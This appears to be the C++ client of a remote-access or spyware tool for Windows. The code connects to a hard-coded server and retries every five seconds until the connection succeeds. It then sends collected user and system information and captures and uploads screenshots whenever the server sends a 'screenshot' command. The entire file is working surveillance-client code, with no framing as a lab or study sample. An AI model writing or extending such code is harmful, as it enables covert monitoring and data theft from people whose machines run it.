#include "network_utils.h"
#include "system_info.h"
#include "screenshot.h"
#include <iostream>
#include <windows.h>
#include <ws2tcpip.h>
#include <thread>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8080

void initializeWinSock() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cout << "WSAStartup failed: " << result << std::endl;
        exit(1);
    }
}

SOCKET createSocket() {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        std::cout << "Socket creation failed: " << WSAGetLastError() << std::endl;
        WSACleanup();
        exit(1);
    }
    return sock;
}

void connectToServer(SOCKET& sock) {
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);
    serverAddr.sin_port = htons(SERVER_PORT);

    while (true) {
        if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            std::cout << "Connection failed: " << WSAGetLastError() << ". Retrying in 5 seconds..." << std::endl;
            std::this_thread::sleep_for(std::chrono::seconds(5));
        }
        else {
            std::cout << "Successfully connected to the server." << std::endl;
            break;
        }
    }
}

void sendData(SOCKET& sock, const std::string& data) {
    if (send(sock, data.c_str(), data.length(), 0) == SOCKET_ERROR) {
        std::cout << "Send failed: " << WSAGetLastError() << std::endl;
        cleanup(sock);
        exit(1);
    }
}

void cleanup(SOCKET& sock) {
    closesocket(sock);
    WSACleanup();
}

void handleConnection(SOCKET& sock) {
    bool connected = true;

    std::string data = getUserInfo();
    sendData(sock, data);

    while (connected) {
        char buffer[1024];
        int result = recv(sock, buffer, sizeof(buffer), 0);
        if (result > 0) {
            std::string command(buffer, result);
            if (command.find("screenshot") != std::string::npos)
                captureScreenshotAndSend(sock);
        }
        else if (result == 0) {
            std::cout << "Connection closed by server" << std::endl;
            connected = false;
        }
        else {
            std::cout << "recv failed: " << WSAGetLastError() << std::endl;
            connected = false;
        }
    }
}
